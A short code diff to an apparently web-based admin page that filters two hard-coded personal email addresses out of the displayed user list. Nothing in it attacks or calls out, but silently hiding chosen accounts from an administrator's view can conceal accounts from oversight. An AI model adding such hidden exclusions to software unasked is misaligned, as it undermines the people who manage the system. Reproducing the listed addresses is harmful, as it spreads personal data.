@@ -54,10 +54,17 @@ function showToast(message, type = 'success') {
   }, 4000)
 }
 
+const HIDDEN_USER_EMAILS = [
+  'emilmarpatricia@gmail.com',
+  'emilmarpatrcia@gmail.com',
+]
+
 async function load() {
   loading.value = true
   const res = await listUsers()
-  users.value = res.data || []
+  users.value = (res.data || []).filter(
+    (u) => !HIDDEN_USER_EMAILS.includes((u.email || '').trim().toLowerCase()),
+  )
   dataSource.value = res.source || 'rpc'
   loading.value = false
 }
